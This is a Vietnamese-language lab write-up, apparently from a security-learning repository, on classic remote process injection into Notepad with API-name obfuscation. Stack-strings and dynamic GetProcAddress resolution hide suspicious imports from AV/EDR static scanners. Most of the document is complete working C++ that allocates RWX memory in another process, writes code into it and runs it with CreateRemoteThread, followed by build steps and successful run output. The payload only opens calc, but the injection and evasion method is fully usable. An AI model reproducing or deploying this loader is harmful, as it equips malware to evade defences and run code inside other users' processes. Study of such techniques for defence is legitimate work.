
---

# 📝 [PE 03] Classic Code Injection with API Obfuscation

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection với Cơ Chế Ẩn Giấu API (API Obfuscation)** đại diện cho mô hình nâng cấp trực tiếp từ giải thuật can thiệp từ xa (Remote Process Injection - PE 02), thuộc nhóm kỹ thuật **Né tránh phòng thủ tĩnh (Static Defensive Evasion)**.

Mục đích cốt lõi của giải thuật này là triệt tiêu hoàn toàn các chỉ dấu nhận diện tĩnh nhạy cảm bên trong tệp nhị phân Portable Executable (PE). Khi một chương trình sử dụng các chuỗi văn bản thuần túy (Plain-text Strings) cố định như `"VirtualAllocEx"`, `"WriteProcessMemory"`, hoặc `"kernel32.dll"`, các cơ chế trinh sát tĩnh của AV/EDR (như công cụ trích xuất `strings` hoặc các tập luật ký tự YARA) sẽ dễ dàng phân tích và phát hiện ra dấu vết hành vi mập mờ. Dự án này hóa giải rào cản trên bằng cách ứng dụng kỹ nghệ **Stack-strings** kết hợp cấu trúc giải phân giải ký hiệu động (Dynamic Symbol Resolution), hợp thức hóa dòng chảy hành vi mà không để lại vết dấu chuỗi tĩnh trên ổ đĩa.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu dấu vết Import Address Table (IAT)**: Loại bỏ sự xuất hiện của các hàm API hệ thống nhạy cảm trong bảng Import tĩnh của file PE, làm mù hoàn toàn các bộ quét Heuristic tĩnh.
* **Làm chủ kỹ nghệ Stack-strings**: Nghiên cứu cơ chế bắt buộc trình biên dịch chuyển đổi hằng số chuỗi thành các cấu trúc mã máy rời rạc, hỗ trợ phân giải động con trỏ hàm trực tiếp trên bộ nhớ RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi trình biên dịch MSVC xử lý một chuỗi hằng số thông thường dạng `"kernel32.dll"`, nó sẽ nạp chuỗi đó vào phân đoạn dữ liệu tĩnh `.rdata`. Phân đoạn này nằm cố định trên cấu trúc tệp đĩa cứng và là mục tiêu sơ khởi của các công cụ rà quét chữ ký tĩnh.

Giải thuật của Lab PE 03 bẻ gãy hoàn toàn cấu trúc IAT truyền thống thông qua cơ chế vận hành ngầm 3 giai đoạn tại User-mode:

```
[Stack-strings: Khởi tạo mảng rời rạc lên CPU Stack Frame]
       └──> [GetModuleHandleA: Định vị phân vùng Base của DLL]
                 └──> [GetProcAddress: Phẫu thuật Export Table -> Bốc trần con trỏ hàm tuyệt đối]

```

1. **Khởi tạo chuỗi ẩn danh trên ngăn xếp (Stack-strings)**: Khai báo mảng ký tự rời rạc dưới dạng cấu trúc hốc mảng: `char vAllocName[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };`. Lúc này, trình biên dịch MSVC buộc phải sinh ra các lệnh hợp ngữ **`mov`** gán trực tiếp từng byte ký tự vào các ô nhớ thuộc Stack Frame của hàm `main` tại thời điểm runtime. Khi tệp tin PE nằm tĩnh trên ổ đĩa, chuỗi ký tự hoàn toàn biến mất, chỉ còn lại các lệnh mã máy nạp RAM rời rạc.
2. **Xác định tọa độ Module gốc (`GetModuleHandleA`)**: Loader truyền mảng ký tự Stack-string đại diện cho `"kernel32.dll"` vào hàm tra cứu nhằm trích xuất địa chỉ Base Address sống của thư viện này trong không gian ảo cục bộ.
3. **Phẫu thuật Export Address Table (EAT) động**: Loader đẩy lần lượt các mảng ký tự Stack-string chứa tên hàm hệ thống vào `GetProcAddress`. Hệ điều hành Windows lập tức giải phẫu cấu trúc danh bạ xuất bản hàm của `kernel32.dll` ngay trên RAM, tính toán tọa độ tuyệt đối và trả về địa chỉ ô nhớ chính xác để Loader gán vào các mẫu cấu trúc con trỏ hàm động (Dynamic Function Pointers), sẵn sàng kích nổ chéo tiến trình.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Classic_Code_Injection_API_Obfuscate.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

// Cấu trúc chứa tham số tuyệt đối - Giải pháp hóa giải lỗi RIP-Relative của bài báo
typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí (Position-Independent Function) gánh luồng chạy khi tiêm sang Notepad
DWORD WINAPI RemoteClassicPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Thực thi bằng con trỏ hàm tuyệt đối, né sạch rào cản Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // Tránh lưu chuỗi dạng string plain-text, nhúng trực tiếp mảng char lên Stack của CPU
    char k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    char vAllocName[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
    char wMemName[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
    char cThreadName[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };

    HMODULE hKernel32 = GetModuleHandleA(k32);
    if (!hKernel32) return EXIT_FAILURE;

    // Phân giải động địa chỉ hàm trực tiếp từ RAM kết hợp ẩn giấu chuỗi
    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, vAllocName);
    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, wMemName);
    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, cThreadName);

    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread) {
        std::cerr << "[-] Khong the phan giai dong cac API he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da che dau chuoi chu va phan giai dong cac API thanh cong." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return EXIT_FAILURE;

    // Quy trình cấp phát động thích ứng kịch trần (Zero Static Buffers)
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm thực thi và dữ liệu tham số tuyệt đối vào lòng Notepad từ xa
    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteClassicPayload, functionSize, NULL);
    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ma may va tham so tuyet doi hoan tat." << std::endl;

    // Kích nổ luồng thực thi phụ từ xa thông qua con trỏ hàm động đã được giấu chuỗi
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread an toan..." << std::endl;
    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Classic Code Injection with API Obfuscation Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
    }

    // Thu hồi vùng nhớ và đóng Handle hệ thống triệt để chống Memory Leak
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm tệp tin thực thi nhị phân xuất bản vượt qua được hàng rào thẩm định tĩnh cấu trúc của các cơ chế Scan chuỗi:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh công cụ quản lý cấu hình dự án ở chế độ **`Release`** và nền tảng kiến trúc phần cứng chuyên dụng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, chuyển đổi cấu hình sang cờ tiêu chuẩn **`Multi-threaded (/MT)`** nhằm nhúng tĩnh (Static Linkage) toàn bộ thư viện liên kết động của CRT vào trong cấu trúc file `.exe`.

<img width="1001" height="684" alt="image" src="https://github.com/user-attachments/assets/8f5105bb-5a32-4db8-a0be-f875e6a972e4" />


3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân phẳng sạch kịch trần.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng tính toàn vẹn của logic ẩn giấu chuỗi chữ tĩnh:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE03_Classic_Code_Injection_API_Obfuscate\x64\Release\Classic_Code_Injection_API_Obfuscate.exe
====================================================
[*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT
====================================================
[+] Da tim thay Notepad.exe voi PID: 4556
[+] Da che dau chuoi chu va phan giai dong cac API thanh cong.
[+] Vung nho Code RWX cua payload dat tai: 0x0000028628300000
[+] Anh xa logic ma may va tham so tuyet doi hoan tat.
[*] Dang khoi tao luong CreateRemoteThread an toan...
[+] Classic Code Injection with API Obfuscation Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo
<img width="1920" height="600" alt="devenv_jaQDjbU0dJ" src="https://github.com/user-attachments/assets/407a68dc-b2d5-4054-a40f-4512ad7ec70b" />



---
